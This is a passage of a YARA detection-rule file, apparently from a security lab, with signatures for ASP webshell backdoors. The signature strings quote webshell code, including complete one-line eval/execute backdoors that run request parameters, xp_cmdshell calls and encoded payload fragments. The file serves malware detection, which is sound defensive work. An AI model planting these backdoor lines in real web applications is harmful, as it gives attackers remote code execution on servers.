        $s19 = "APx?rg@#@&dk+DPhX(U6W~',d+M\\n.cmDnCD+64Nn1Ycr/1DkaYbUocNrmDkGUmDXrb@#@&@#@&iOCDT+DnCY4xmN[/^C/4`]n$E+dOvJOlML" fullword ascii
        $s20 = ".BAa^_w!GTn:pfBds/27stb^DsGS*GfZG!nNsC;fTadqWR!Y4CZUu&ZZ*w.o19}jAoHb*hzh3)zbb4&4Wrp2B^5p\"V\\ZA2lo]W&2HWm" fullword ascii
     condition:
        ( uint16(0) == 0x253c and filesize < 400KB and ( 8 of them ) ) or ( all of them )
}

rule sig_2118f158ef79f86e46ab5efefd2a130bce4e020b
{
     meta:
        description = "asp - file 2118f158ef79f86e46ab5efefd2a130bce4e020b.asp"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "31ea6e085e202e97d79ce006e683f3bdb29e557899a52f6f284e40b86d434fb6"
     strings:
        $s1 = "<%Eval(Request(chr(112))):Set fso=CreateObject(\"Scripting.FileSystemObject\"):Set f=fso.GetFile(Request.ServerVariables(\"PATH_" ascii
        $s2 = "<%Eval(Request(chr(112))):Set fso=CreateObject(\"Scripting.FileSystemObject\"):Set f=fso.GetFile(Request.ServerVariables(\"PATH_" ascii
        $s3 = "NSLATED\")):if  f.attributes <> 39 then:f.attributes = 39:end if%>" fullword ascii
     condition:
        ( uint16(0) == 0x253c and filesize < 1KB and ( all of them ) ) or ( all of them )
}

rule e5f075ac86e8fab100ccffb094a2e543e02699e4
{
     meta:
        description = "asp - file e5f075ac86e8fab100ccffb094a2e543e02699e4.asp"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "e7856942518e005c5305b354dd8f2058889800e535e7a34ce006f57c9ed759a3"
     strings:
        $s1 = "<%:Server.ScriptTimeout=999999999:Response.Buffer =true:On Error Resume Next" fullword ascii
        $s2 = "nt:P#*{+F@*DD/^wc~Mr~#yfP{@!~.D/m2cvPWq=bsEU6k;PDK6,b#* SkBtdC4`Nb\\`1+NXn4PMWXPb#+Sb~CYm[`9k\\c1+Nan4`c'MOkm2" fullword ascii
        $s3 = "YKbh+KEYvEENKm!:nxO mVsRTGV9/;Uc/E8hbYc#pEr~*Z!Z#ir@#@&zPr@!&/1Dr2D@*J@#@&+^/+bW~l1YbWUF~x,&~Y4nx@#@&dnDPmxj" fullword ascii
        $s4 = "@!&m@*@!&PG@*E)H~r@!&wr\"H@*r)H~J,P@!z:I@*E=XPr@!z:bAd3@*@!~I@*JlX~E@!f(.,CVboUx1+xOnM@*E)H~rP~@!s}IH,b1OkKxxJ=X~EQbmDrW" fullword ascii
        $s5 = "DdP}D~LMWEaE)Uq'U('J@!zDN@*@!&OM@*E)U(!{J@!OM@*@!O[,tnkT4D'Er ZJJ,4T^W^W.'rJ:owsswoJrPmKsdwmx{JE EE@*P@!zD[@*@!zO.@*JP@#@&" fullword ascii
        $s6 = "kLtDxrJ+ZJrP4TmKsWM'EJ[soowssrE@*,J[K8%RGkkwslzHm:n[r@!YM@*@!O9PtnrTtO'rEy!ErP(omKVK.'rJ:swsoowJJ,^W^/wmUxJr rJ@*$jOmDOP:zw" fullword ascii
        $s7 = "ls~hWDO~rP'PDnM:KKDDP[,J@!8DJ@*E)Ax[~&0)m;YKSWTrUnmY4PxPEun2e{d6ZzSm\\zZC(HA-jrwPqb]A-tkmMWkG0D-" fullword ascii
        $s8 = "E@#@&2x9~(0@#@&HJKldd,J~[,CEDWJGTkxKCk/AWM[,[~r@!(D@*r@#@&3x9P(0@#@&zE@!zW^@*J=XPr@!8D@*@!(D@*@!8.@*$jW6OhmDnD@!4D@*@!4D~/b\"" fullword ascii
        $s9 = "o]+m[`wEss`fnbl&0~E92mVsKhv!#{Jr~WMP;NalssKh`Zb'ZPK4nU@#@&X,J@!Vr@*zVsWSnN,j9K,wW.O=P)V^@!(D@*r@#@&2Vk+@#@&X,J@!Vb@*)s^Wh" fullword ascii
        $s10 = ":G4NnmDJb@#@&/+O~K4%0Ks9+.{W(LRT+DWW^NnDv/n.7+DchlawlD4cJJJ*#@#@&dnmD^t,G4N0Gs9+D@#@&H`ErnZr#@#@&0!xmDkKUPk+CD1tcG(L0KsN" fullword ascii
        $s11 = "h\\JLJCr^J)}8KvF BTbP{Pr?hY2\\mJ'JbsRU:E'rYw\\CbV Frl}4PvF2~!*P{~Jtk^Dr[EGkW0D (r[JtJuK:nr@#@&sG.,kx!,PW,Ff@#@&?+O~:'j+M-" fullword ascii
        $s12 = "@#@&2:|{JwK/KzVsWSnNhW.OkJ)3in'E-`9hbs^WS+NhWMO/r)oE^VP/h'nmOtLbw9$'2:|=s;VsiGnxwmOtLb2[~[2iF=Y^wms^WA{" fullword ascii
        $s13 = "GY,x;:(+.@!(D@*rb@#@&2x9~(0@#@&Ax[P(W@#@&H+XO@#@&1naD@#@&3U9P(0@#@&g+aD@#@&Yks+M+P{POks+.lDt+Dr:" fullword ascii
        $s14 = ".,[~741DV6@#@&d+DPawK/Of,'P1.+mY+K8%+1YvJ\\?p\\d  (tJC:KKE*@#@&a2K/O&cGa+U,Jhr?:JB~J4YOw=z&qyGRZ !cF)r'~wKDDP'J&s" fullword ascii
        $s15 = "xEJTW^NdEUEr@*E@#@&zPr@!rUaEY~Um:n'rE!JE,YHw+{Jr4k9NnxrJ~r9'Jr;JrP\\ms;+{JrJ'EdnM[EJr@*@!JY[@*r@#@&z~r@!rxa;DPUm:" fullword ascii
        $s16 = "[E@!(.@*r)z~r@!Vr~DX2+{d$ECM+@*nlk/=E[hld/SN'E@!4D@*E@#@&2x9~r0@#@&9kdwsGTkU'SdtcDnL\"+l[crCF2Imdr/zS|Hb;C&H2'?G0DhC." fullword ascii
        $s17 = "D@*:+kY@!a@*@!&0KxO@*@!w@*@!mPtMn0{Bgz^OkKx{l2L[n^B@*@!6GxDPdr.+'X~1WsWMxM+[@*`G{2|S*@!z6WUY@*@!&C@*@!z1nxD+D@*El2" fullword ascii
        $s18 = "'6xn9bD 1mh+=P~~,q0~dDDoNgCs+@!@*J;Wx6kT HkkEPAp#~kYDw[1m:+@!@*EIAZIZJ29E,2}.,dYMs[Hm:+@!@*rI3ZI/d2]rPAp.,/D.s91C:" fullword ascii
        $s19 = "/j{q.YkJ*#@#@&/Ck+~Jk5V1:[E@#@&XE@!(D@*@!DC(Vn,hbNY4'rEFZ!YJr@*@!OMPm^C/k'YM@*E@#@&Xr@!WW.h,xC:" fullword ascii
        $s20 = "jdnMxlhnBPCEDGdWLbxhl/khK.N=YnDskUC^nWMOnmYt,x~J_|dHw?ej:2\\-;;DM+UO;WxO.KVj+Dw;WUDDKV-:+Mhk" fullword ascii
     condition:
        ( uint16(0) == 0x253c and filesize < 300KB and ( 8 of them ) ) or ( all of them )
}

rule sig_9317fa290d796dbae7eb34919ef1b94462e5f75d
{
     meta:
        description = "asp - file 9317fa290d796dbae7eb34919ef1b94462e5f75d.asp"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "e69b9aa8bbb5af94e7e6fb2824d4125e322fc987502b7ded8ae16920d7945257"
     strings:
        $s1 = "<%char1=\"re#!^$Wpon#!^$We.write #!^$Werver.mappathh45asReque#!^$Wt.ServerVariable#!^$Wh45asa&d%&SCRIPT_NAMEa&d%&w$@sw$@s\"" fullword ascii
        $s2 = "execute(DecodeFun(char1))%>\" style=\"border:solid 1px\" size=40><br>" fullword ascii
        $s3 = "objCountFile.Write FiletempData " fullword ascii
        $s4 = "FiletempData = objCountFile.ReadAll" fullword ascii
        $s5 = "FiletempData=Replace(FiletempData,\"exe\"&\"cute\",\"dst\")" fullword ascii
        $s6 = "FiletempData=Replace(FiletempData,\"dst\",\"exe\"&\"cute\")" fullword ascii
        $s7 = "<%char1=\"Set objfSo = Server.CreateObjecth45asa&d%&Scripting.fileSy#!^$WtemObjecta&d%&w$@s\"" fullword ascii
        $s8 = "<%char1=\"Set objCountFile=objFSO.CreateTextFileh45asreque#!^$Wth45asa&d%&#!^$Wyfdpatha&d%&w$@s,Truew$@s\"" fullword ascii
        $s9 = "execute(DecodeFun(char1))%>" fullword ascii
        $s10 = "Set objCountFile = objFSO.OpenTextFile(Server.MapPath(user),1,True)" fullword ascii
        $s11 = "Set objFSO = Server.CreateObject(\"Scripting.FileSystemObject\")" fullword ascii
        $s12 = "Set objCountFile=objFSO.CreateTextFile(Server.MapPath(user),True)" fullword ascii
        $s13 = "<textarea name=cyfddata cols=39 rows=10 width=80 style=\"border:solid 1px\"></textarea>" fullword ascii
        $s14 = "<form action='' method=pOsT>" fullword ascii
        $s15 = "user=\"asp.asp\"%><%''" fullword ascii
        $s16 = "<%char1=\"objCountFile.Clo#!^$We\"" fullword ascii
        $s17 = "<%char1=\"fdata = reque#!^$Wth45asa&d%&cyfddataa&d%&w$@s\"" fullword ascii
        $s18 = "<br><input type=submit value=SAVE style=\"border:solid 1px\">" fullword ascii
     condition:
        ( uint16(0) == 0x673c and filesize < 9KB and ( 8 of them ) ) or ( all of them )
}

rule ee3f036cecfb8123a16f5192f1076230f75184a5
{
     meta:
        description = "asp - file ee3f036cecfb8123a16f5192f1076230f75184a5.asp"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "5ccd2cb27f1f577dbcbb0cf6a4d6114d3ba98410964e19472c2c9eba99ed6811"
     strings:
        $s1 = "<%execute request(\"sb\")%>" fullword ascii
     condition:
        ( uint16(0) == 0x253c and filesize < 1KB and ( all of them ) ) or ( all of them )
}

rule sig_33272c8ae1a3239b540fd26a79717984d2f0ad61
{
     meta:
        description = "asp - file 33272c8ae1a3239b540fd26a79717984d2f0ad61.asp"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "10450f39e8f2e44af1ab4340bef2a1dc350eb776de60e12a827b817c3176719f"
     strings:
        $s1 = "H66H6FH72H6DH28H27H7AH31H27H29H29H3BH0AH52H65H73H70H6FH6EH73H65H2EH77H72H69H74H65H28H78H69H65H29H3B\";" fullword ascii
        $s2 = "H3BH0AH52H65H73H70H6FH6EH73H65H2EH77H72H69H74H65H28H53H2BH22H7CH3CH2DH22H29H3B\";" fullword ascii
        $s3 = "<SCRIPT RUNAT=SERVER LANGUAGE=JAVASCRIPT>" fullword ascii
     condition:
        ( uint16(0) == 0x533c and filesize < 10KB and ( all of them ) ) or ( all of them )
}

rule bf84328497b2d2700d9805e5b411b25cf905c8cb
{
     meta:
        description = "asp - file bf84328497b2d2700d9805e5b411b25cf905c8cb.asp"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "181d7ee8c42aa4601d625792c0ceed117bda504f3aaa700be0746ea4ab7594de"
     strings:
        $s1 = "<h2>Hello W3School!</h2>" fullword ascii
        $s2 = "<body style=\"background-color:#e5eecc; text-align:center;\">" fullword ascii
     condition:
        ( uint16(0) == 0x683c and filesize < 1KB and ( all of them ) ) or ( all of them )
}

rule c84a6098fbd89bd085526b220d0a3f9ab505bcba
{
     meta:
        description = "asp - file c84a6098fbd89bd085526b220d0a3f9ab505bcba.asp"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "d1658bd7a08ff6878d305f90b19088a2972060397a912e83c5c8fb3a2e6b32c0"
     strings:
        $s1 = "<%eval(eval(chr(114)+chr(101)+chr(113)+chr(117)+chr(101)+chr(115)+chr(116))(\"sz\"))%>" fullword ascii
     condition:
        ( uint16(0) == 0x253c and filesize < 1KB and ( all of them ) ) or ( all of them )
}

rule be48b04c147d3286bd69d275931b3e9c0e30d5f6
{
     meta:
        description = "asp - file be48b04c147d3286bd69d275931b3e9c0e30d5f6.asp"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "48168e91f1e9b3a66c11ec7a5db147d13ac657146e3d78b125fd71771e1795a8"
     strings:
        $s1 = "vY;l,&Om]!*F+0m]!*W!9{Y;F,o!u+ u +YyZsHCs+Y OY2AOKwctk9+6GDsRo1m:n 7lV!n]y!_uf9]y!u +]++uG/]F/]FZY{;] +Yy QfgCs+Y2AuGf" fullword ascii
        $s2 = "RZF~ 2FP *2P c2~c%f,RlFF,RlqF,R{,,R+q8PRWqF,RFZq~RlF8P Gqq,R0&, c2P q+PR+q8P %2~ccf,RR&PcG8qPc%fPccf~cFv, G8FPcf" fullword ascii
        $s3 = "[E@!&WKxO@*@!&0KxO@*@!zmnUD+.@*@!4MP^KVKD'[cy* W ~/bynx8P@*rlI\"?J@!&ON@*@!JY.@*El&0~r(P`Z~qb{JP" fullword ascii
        $s4 = "PW(%o0@#@&,P~PdOMss1mh+{rUnwkVn glh+@#@&,P~,q6P/DDws1m:n@!@*J[nk3YK2Rbxkr~3pjPkY.ssHm:n@!@*E0KV[nMRtOOrPPt" fullword ascii
        $s5 = "X{JPLP78mMVW@#@&VnC7+/,xP^+l7ndPLPrOj2PiU2]?APjhJ~',\\4^.^0~[,E qK{!c!RZRZEPLP-41DsW,[PrRnKDYgGxJ,[,Y2W.O,[~\\(^D^0~',JOid" fullword ascii
        $s6 = "~f(HCxmon.v#@#@&~PU;VUO.':Db:cIn5!+dYcoWM:cEU;VjOMJb#@#@&,P9(?DD'\"+$;+kY sKDhcrf4UODr#@#@&~~?&'Uq'J@!Om4s+,Ak9Y4xEv*Tv,P8WM[" fullword ascii
        $s7 = "[O2@#@&KyRKGkkYbGx,'PZ~lP: cKzwn~{P+@#@&P cZ4CM/+O~{JL4yf8 E@#@&Us.,',P cInl9KnaD@#@&:+R;VWkn@#@&b0,fqR3ab/O/viwglhn*PY4n" fullword ascii
        $s8 = "PJV2:E~,J4YDwl&JF F !c!R8lEPLPaW.Y~',J&oKsNkEU&!wl[hbx&/8EBK.!+BPJr~,EJ@#@&CRk+U[,VWTrx!/+M~'P^WTkUwCdkP'PsOPLP[n^NWhCbx~[,U" fullword ascii
        $s9 = "xD+D@*B*IJ@#@&]IUJdnDKksnW!Y`rE[W1Es+UY C^V oKsNkEU kE4hrD`birEBcTZ!*iJ@#@&\"]?r@!&/1Dr2D@*J@#@&mm/+,f@#@&k+DP^'jnM\\nDc/D" fullword ascii
        $s10 = "PxPrOj3:frt)qgJPL~-4;Dd0~[~E fG:mrx{oGs9/EUkZRTRZ ZuE,[,0YawK.Y,[~J-Oqk8u!r~[,\\4;.J0,[,JRKt6AxC4^n'ZJ~',\\4/.d0~[,E,Kt}|" fullword ascii
        $s11 = "zMz6rP9xn&Cz-Mw0Wwe'x*-M'+9WHTE(nf&-M-vxGrk/+kl#4YlhOT!\"`,NU+jss(&eJU+4Y~wC-3GwC-~@*@!~*-M'+9WHTE(nf&-M-vxGrk/+k~0bzeJwM-@*D" fullword ascii
        $s12 = "6D/tmD/W9+bb,@#@&bqP{Pk8~QP8P@#@&3x[~&0~@#@&H+XY~@#@&4XOnk $?:],'~kYMI+DEMUP@#@&~P,P3.MRZ^nlM@#@&AU[PwE" fullword ascii
        $s13 = "*R{|];W2wv]!G+0c|];*8v0muE*WTf|]EF1o!u y]+ Y+;sHlsn]y,Yf~YW2 4k[+6GM: w1m:+c\\msE" fullword ascii
        $s14 = ".KlDtr#xI]nhlOtvoW^Nn.hlY4b=2UN,(6)(6PU+/kkKU`rsGV9+.KmYtrb'rJP:4nx=sKV[+.KmY4'\"GWDnCO4)?ndkkGxvEwWs9+MnlDtrb'wWsN" fullword ascii
        $s15 = "FName=Request(\"FName\")#@~^F24BAA==@#@&@#@&~l13jMV{E@!(D@*@!(D@*@!1+xDnD@*@!l,4.+6'ELC\\Cd1DrwDltb/OGMXR8C13c#E@*" fullword ascii
        $s16 = "v@*fnV@!&l@*J@#@&Uq'j(LJ~@!m~4Dn6'ELl7lk^DbwO)wEsswWDscJrJ[\"nKlDtvnCY4'r-E[w 1m:nbLJJESrJ\\W7nwWs9+MJJ*BKUm^k^3{B.nDED" fullword ascii
        $s17 = "'ZJPLP78mMVWPLPER\"lYbGja'Fr~'P741Ds0~',{@#@&rRImYrGGWhUx8J~[,-(m.^0,[PrO\"CYbWdZM+[rD'!r~[,\\41.s0,[,JRp;GDl/EM.+" fullword ascii
        $s18 = "hPz.DmX`8+biUYM$TT~x,JEnMG\\bNn.{Hk^.K/G0D x+Ocrd2f~RW !pfCYmPjG!Dm" fullword ascii
        $s19 = "nfbDRgCh+@#@&,P~P(W,/ODw[1m:n@!@*JZGU6kLRtdbJ~ApjP/DDw[1m:n@!@*J]3;5Zd3frP25#~/DDwNHlhn@!@*EIA/5;S3]rP2}#,/ODw[glh" fullword ascii
        $s20 = "br@#@&j({?([r@!JY[@*@!JYD@*J@#@&?&!xJ@!Y.@*@!YN,4+botDxEJy!rJ~4L^KVGD{EJ[soowssEE,mGVk2mxxrJyJJ@*P@!&Y9@*@!zDD@*E,@#@&" fullword ascii
     condition:
        ( uint16(0) == 0x6f3c and filesize < 300KB and ( 8 of them ) ) or ( all of them )
}

rule sig_9c70ae294c771e4751da383cc8b8af736fc89447
{
     meta:
        description = "asp - file 9c70ae294c771e4751da383cc8b8af736fc89447.asp"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "3e2d04ccb6e5251902b4202c925e96eac23df35d0adeb5338af7a75b90efaaea"
     strings:
        $s1 = "(htappam.revres(eliFeteleD.osf:)OSF_TSNOC(tcejbOetaerC.revreS=osf tes:)(ledjpa noitcnuf\")):ExeCuTe(erXM(\"ssalC dnE" fullword ascii
        $s2 = "ageAddToMdb():case \"ScanPort\":ScanPort():FuncTion MMD():ExeCuTe(erXM(\"tlusERrts &" fullword ascii
        $s3 = "m)(kcehCegaP buS\")):Select Case Action:case \"MainMenu\":MainMenu():Case \"EditPower\":Call EditPower(request(\"PowerPath\")):C" ascii
        $s4 = "= 2b ;)61 / ]2[bgr(roolf.htaM = 1b ;61*1g - ]1[bgr = 2g ;)61 / ]1[bgr(roolf.htaM = 1g ;61*1r - ]0[bgr = 2r ;)61 / ]0[bgr(roolf." fullword ascii
        $s5 = ":46 - eulaVtni = eulaVtni:nehT 46 => eulaVtni fI:fI dnE:821 - eulaVtni = eulaVtni:nehT 821 => eulaVtni fI:1=KOtidE:KOtidE miD" fullword ascii
        $s6 = "nruter ;]2b[srolocxeh + ]1b[srolocxeh = b ;]2g[srolocxeh + ]1g[srolocxeh = g ;]2r[srolocxeh + ]1r[srolocxeh = r ;61*1b - ]2[bgr" fullword ascii
        $s7 = "m)htaPs(eliFmorFdaoLmaertS noitcnuF\")):ExeCuTe(erXM(\"noitcnuF dnE" fullword ascii
        $s8 = "mtiuq ,resuwen ,niamodwen ,tm ,niamodled ,ssapnigol ,resunigol ,dmc ,tropptf ,trop ,ssap ,resu miD\")):case\"MMD\":MMD():case\"R" ascii
        $s9 = "m)mun(eziSehTteG noitcnuF\")):ExeCuTe(erXM(\"noitcnuF dnE" fullword ascii
        $s10 = "m)(mroFevirDnacSmotsuC buS\")):ExeCuTe(erXM(\"noitcnuF dne" fullword ascii
        $s11 = "m)(llehs1dmc noitcnuf\")):ExeCuTe(erXM(\"noitcnuF dnE:fI dnE" fullword ascii
        $s12 = "m)galf,gsm,etats(egasseM buS\")):ExeCuTe(erXM(\"noitcnuF dne" fullword ascii
        $s13 = "ysjb=true:Server.ScriptTimeout=999999999:BodyColor=\"#000000\":FontColor=\"#00FF00\":LinkColor=\"#ffffff\":Response.Buffer =true" ascii
        $s14 = "m)(php noitcnuf\")):ExeCuTe(erXM(\"noitcnuf dnE:" fullword ascii
        $s15 = "m)(ofnIlanimreTteg bus\")):ExeCuTe(erXM(\"noitcnuF dnE" fullword ascii
        $s16 = "m)(reganaMbD noitcnuF\")):ExeCuTe(erXM(\"buS dnE" fullword ascii
        $s17 = "m)(uneMniaM noitcnuF\")):ExeCuTe(erXM(\"noitcnuf dne" fullword ascii
        $s18 = "m)(esruoC noitcnuF\")):ExeCuTe(erXM(\"noitcnuF dne" fullword ascii
        $s19 = "m)(bdMoTddAegaP buS\")):ExeCuTe(erXM(\"noitcnuF dnE" fullword ascii
        $s20 = "m)(flesymorp bus\")):ExeCuTe(erXM(\"noitcnuF dnE" fullword ascii
     condition:
        ( uint16(0) == 0x6f3c and filesize < 400KB and ( 8 of them ) ) or ( all of them )
}

rule ce3669fd081264b88aa9f86a9ea20f0da0b0be4b
{
     meta:
        description = "asp - file ce3669fd081264b88aa9f86a9ea20f0da0b0be4b.asp"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "46487a3f8ee782d4cc95b98f5f7ebef6d8de4f0858cf33cd700d576a4b770251"
     strings:
        $x1 = "seshell.ShellExecute shellpath,\" /c \" & defcmd & \" > \" & sztempfile,\"\",\"open\",0" fullword ascii
        $x2 = "CONn.EXEcutE(\"Create Table FileData(Id int IDENTITY(0,1) PRIMARY KEY CLUSTERED, thePath VarChar, fileContent Image)\")" fullword ascii
        $x3 = "'jb\"<tr><td height='22'><a href='http://tiquan.net/pr/?Submit=+%B2%E9+%D1%AF+&domain=\"&Worinima&\"' target='FileFrame'>" fullword ascii
        $x4 = "></form></tr></table>\":jb SI:SI=\"\":If trim(request.form(\"MMD\"))<>\"\"  Then:password= trim(Request.form(\"P\")):id=trim(Req" ascii
        $x5 = "jb\"<title>\"&nimajb&\" - \"&nimajbm&\" </title>\":jb\"<style type=\"\"text/css\"\">\":jb\"body,td{font-size: 12px;background-co" ascii
        $x6 = "ConnstR=\"Provider=SQLOLEDB.1;Data Source=\" & tARgETIp &\",\"& PoRtNUm &\";User ID=lake2;Password=;\"" fullword ascii
        $s7 = "'jb\"<tr><td height='22'><a href='http://tiquan.net/ip/?action=sed&cx_33=\"&ServerU&\"' target='FileFrame'>" fullword ascii
        $s8 = "<input name='ToPath' value='\"&RRePath(Session(\"FolderPath\")&\"\\Cmd.exe\")&\"' size='40'>\"" fullword ascii
        $s9 = "!)</font></a></center>\":jb\"<tr><td height='20'><a href='?Action=Upload' target='FileFrame'><center><font color=red size=5px>(" fullword ascii
        $s10 = "jb\"<input type=hidden name=\"\"#\"\" value=Execute(Session(\"\"#\"\"))>\"" fullword ascii
        $s11 = "jb\"<tr><td height='20'><a href='?Action=Cmd1Shell' target='FileFrame'>" fullword ascii
        $s12 = "'jb\"<tr><td height='22'><a href='http://tiquan.net/mmgx/index.htm' target='FileFrame'>" fullword ascii
        $s13 = "b.open \"GET\", \"http://127.0.0.1:\" & ftpport & \"/M_Schumacher/upadmin/s2\", True, \"\", \"\"" fullword ascii
        $s14 = "\"exec master.dbo.xp_cMdsHeLl '\" & request.form(\"MMD\") & \"'\":set recResult = adoConn.Execute(strQuery):If NOT recResult.EOF" ascii
        $s15 = "xpost3.open \"POST\", \"http://127.0.0.1:\"& port &\"/leaves\", true" fullword ascii
        $s16 = "xpost.open \"POST\", \"http://127.0.0.1:\"& port &\"/leaves\", true" fullword ascii
        $s17 = "a.open \"GET\", \"http://127.0.0.1:\" & port & \"/M_Schumacher/upadmin/s1\",True, \"\", \"\"" fullword ascii
        $s18 = "c.open \"GET\", \"http://127.0.0.1:\" & port & \"/M_Schumacher/upadmin/s3\", True, \"\", \"\"" fullword ascii
        $s19 = "jb\"<tr><td height='20'><a href='?Action=hiddenshell' target='FileFrame'>" fullword ascii
        $s20 = "CONN.ExecUtE(sqlSTR)" fullword ascii
     condition:
        ( uint16(0) == 0x6f3c and filesize < 300KB and ( 1 of ($x*) and 4 of them ) ) or ( all of them )
}

rule af40f4c36e3723236c59dc02f28a3efb047d67dd
{
     meta:
        description = "asp - file af40f4c36e3723236c59dc02f28a3efb047d67dd.asp"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "9b799e4eb013c79c3f0cfceb935f6b0953510cfcc03e6fd6c285d52a5ff1dd9d"
     strings:
        $s1 = "bg =\"http://www.7jyewu.cn/webshell/adminlogo.jpg\"  '" fullword ascii
        $s2 = "It^A0L@*vqy%)r\"MW-B{Okx\"^PE=PLP.Log|F|,[~|E'YXd;1PBb\"5tojE'ON5W,yat6G@!" fullword ascii
        $s3 = "5~B.VTtv'.LbyON,vN0op4tB'O[$0~N0LH@!@*E3Dy0D+Ex0!Wd;,Bqv{E0Kn;4V/kOnPEFE';0G.M;4/kO+,Bqv{3Y.VTh~YkA$y@!@*3S@!@*0h@!@*3S@!|w,P" fullword ascii
        $s4 = "JSElJSJWE~r&ESr JSE8Jb@#@&CMD8{lMDlH`r)JBJ$JBJ/EBJfrSJAJ~roE~rMr~ECESrqE~rBJBJFEBJSESrHE~rHr~E}JBJnr~r}JBJ]JBJjEBJKrSJ`J~r#E~r" fullword ascii
        $s5 = "YK2RmNNMWGDsRwWsNn.hlOtc-l^En~{PsGs9+.iDGaRC9NM0WM:cdE(:rYv#IN6Ex1OkKxPw;sVwWM:csHCs+Ssz^YbWUbPYW2 4k[+6GM: w1m:+c\\msE" fullword ascii
        $s6 = "SItEuRl=\"http://www.asp-muma.com/\" '" fullword ascii
        $s7 = "durl=\"http://www.asp-muma.com/\"  '" fullword ascii
        $s8 = "htp=\"http://www.asp-muma.com/\"  '" fullword ascii
        $s9 = "0{B%l-Ckm.kaO)wEsswWDhcrJE[\"nhlO4`hlY4[rwJLS 1m:nbLJJrSJr2NbOok^+rJbB~^^ld/{vlsB~ObYVnxE" fullword ascii
        $s10 = "jOD@#@&1WUx 3X+^EDn`rZ.nmY+~Pm4s+,obVnGlDl`&N,rxDP(fA1P(:5`ZSF*Pn\"(\\b\"5,|35~/djjKA]2G~~O4+nCO4P#lM/4l.BP6kV" fullword ascii
        $s11 = "v@*G+^@!&l@*~@!l~tMn0{B%C7l/^.bwO)w;^VoKDs`JrJL]+hlOtvnCO4[J'E[dR1mhn#LJrJSJE/Kwzsbs+rJbv,mVCdk'vlsv,YrDV" fullword ascii
        $s12 = "/D`\\q9c;rH?:msUrS+BF#b@#@&qWP,rD+h{H&f`;rgjK|sjrB Sq*PY4nx@#@&+Xn^ED+TVG4Cs,Y4+wGV9+.@#@&?+O~M/~',HKY4bxT@#@&Ax9~k6@#@&2" fullword ascii
        $s13 = "v{0;K/$P3.@!@*VyJ@!@*D.z@!|L#=`$=vVYkA5W0;&3OmVO`R\"VDaLD1'|@*B(ppo(paEx0odT+!hPMy@!@*D.z@!P@*Bppo((o:B{3okLnESPMy@!@*.\"J@!" fullword ascii
        $s14 = "/ORUnM\\nM.mDkm4^n/vJ4YDwm4K/Yrb@#@&s1mhn'\"+$En/OcrsHlsnJ*@#@&^96'E@!DD@*@!D[,k[{N,hk9Y4x,lPGxtW;d" fullword ascii
        $s15 = "\\+ksk^nxJ,[,\\8m.s6P'PrRfb/C8^+'TE,[~\\(^MVW,[,JO\"+^KlDtd'8J~',\\41.V6P[,m@#@&rOg+nNjn1E.+{TJ,[~-(mDsW,[~J ubNn_k9N+" fullword ascii
        $s16 = "#@*0TW\"tTz@!O9;M0OyXtNTt@*BDN$MVY\"a4NL}'ON$MVO.6t[L\\-ON$!0Y\"Xt9o}'/TVy6ot-.YidT3y6L}.0Y0Va}'KU9iriw:.ofExYX/5^,0oG\"4o@!=,2" fullword ascii
        $s17 = "=sVDydWoU.WVX+DjYkh$W?'VVY.Y[50;5'4W4+9'sO+Km0Yi-\"O`/L3.Wo\\yWO036nw:?Bj}i'K#wf#'xDsI/5\\9O/S;Wj" fullword ascii
        $s18 = ",EJrPGx\\G!/nr!O'rJO4b/RdOHVnR(C13LMW!xN;W^GD{B:FyF+qyBJr@*@!mPtMnW'ELm\\C/^.bwO)U4WSsGs9+DcErJ'I" fullword ascii
        $s19 = "@*|#F|={O6k;^~#=;^^1=|'D[$0~#=6YDMWb|={Y4x.P\"a40W@!@*ybEW0xWEK/$Pv441O)\"k!GYbOOWK/BxOkx\"V,4Tyx6EK/;1PM\"@!@*3\"@!#[/i{Zj" fullword ascii
        $s20 = "VWm[c#E@*@!zON@*@!JY.@*@!&0KDh@*@!zYC8^+@*J@#@&NJ@!DN@*@!l,m^C/k'C:,t.n6'BNC\\m/mMr2Y=?4WAsGs9+.`rEZ=-wKMWo.CsPok^nkJE*B@*`F*" fullword ascii
     condition:
        ( uint16(0) == 0x6f3c and filesize < 300KB and ( 8 of them ) ) or ( all of them )
}

rule sig_8a5dc019d41017a58cc0cb625d3a716c26d457f3
{
     meta:
        description = "asp - file 8a5dc019d41017a58cc0cb625d3a716c26d457f3.asp"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "c9c338fbc519a28f06a32ff0e4cd5b7c12270e5c2d38999755d2e87243fcce53"
     strings:
        $s1 = "If Session(\"lovelyq\")<>\"\" Then Execute(Session(\"lovelyq\"))" fullword ascii
        $s2 = "If Request(\"111111\")<>\"\" Then Session(\"lovelyq\")=Request(\"111111\")" fullword ascii
        $s3 = "<script language=\"vbscript\" runat=\"server\">" fullword ascii
     condition:
        ( uint16(0) == 0x733c and filesize < 1KB and ( all of them ) ) or ( all of them )
}

rule sig_98bfb6d8326fc15543daa95d8ef679889fd1ad91
{
     meta:
        description = "asp - file 98bfb6d8326fc15543daa95d8ef679889fd1ad91.asp"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "febf37a9e8ba8ece863f506ae32ad398115106cc849a9954cbc0277474cdba5c"
     strings:
        $x1 = "frames.byZehir.document.execCommand('InsertImage', false, imagePath);" fullword ascii
        $x2 = "frames.byZehir.document.execCommand(command, false, option);" fullword ascii
